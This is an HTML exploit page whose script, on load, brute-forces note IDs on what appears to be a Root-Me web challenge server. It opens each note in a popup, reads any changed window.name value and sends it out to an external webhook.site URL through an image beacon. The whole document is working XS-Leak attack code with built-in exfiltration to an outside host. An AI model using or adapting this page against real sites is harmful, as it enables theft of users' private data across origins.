<!DOCTYPE html>
<html>
<head>
    <title>Window Name XS-Leak</title>
</head>
<body>
    <h1>Checking notes...</h1>
    <div id="status"></div>
    <script>
        const TARGET_BASE = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
        const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
        const START_ID = 1378;
        const END_ID = 2000;
        const DELAY_MS = 500;

        function updateStatus(msg) {
            const div = document.getElementById('status');
            div.innerHTML += msg + '<br>';
            console.log(msg);
        }

        async function checkWindowName(id) {
            return new Promise((resolve) => {
                const url = TARGET_BASE + id;
                const popup = window.open(url, 'leakWindow');
                if (!popup) {
                    updateStatus(`Popup blocked for ID ${id}`);
                    resolve(null);
                    return;
                }
                const initialName = 'initial_' + Date.now() + '_' + Math.random();
                popup.name = initialName;
                setTimeout(() => {
                    let newName = popup.name;
                    try {
                        popup.close();
                    } catch(e) {}
                    if (newName && newName !== initialName) {
                        resolve(newName);
                    } else {
                        resolve(null);
                    }
                }, 1500);
            });
        }

        async function run() {
            updateStatus(`Scanning IDs ${START_ID} to ${END_ID}...`);
            for (let id = START_ID; id <= END_ID; id++) {
                const leaked = await checkWindowName(id);
                if (leaked) {
                    const reportUrl = `${WEBHOOK}?id=${id}&name=${encodeURIComponent(leaked)}`;
                    new Image().src = reportUrl;
                    updateStatus(`✅ Found ID ${id} with window.name: ${leaked}`);
                    break; // remove break to continue scanning
                }
                updateStatus(`ID ${id}: no name change`);
                await new Promise(r => setTimeout(r, DELAY_MS));
            }
            updateStatus('Scan complete.');
        }

        run();
    </script>
</body>
</html>
